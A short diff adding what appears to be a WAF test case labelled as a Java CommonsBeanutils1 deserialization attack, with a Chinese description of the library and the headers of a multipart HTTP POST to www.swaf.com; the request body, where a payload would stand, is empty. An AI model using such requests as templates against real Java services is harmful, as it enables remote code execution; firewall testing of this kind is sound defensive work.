@@ -1,0 +1,10 @@
+# 反序列化-JAVA CommonsBeanutils1
+# CommonsBeanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
+POST /?acid=80001741&bid=hd_tag_m8mv25ms HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ms
+RM-PRO-Token: 84f97bd55316ed1e62c06249f39e865b
+RM-PRO-Time: 1742808482229
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=EZ1BtzPU1mIv-s2E8-iDqmLyNfN5N9Sa
+
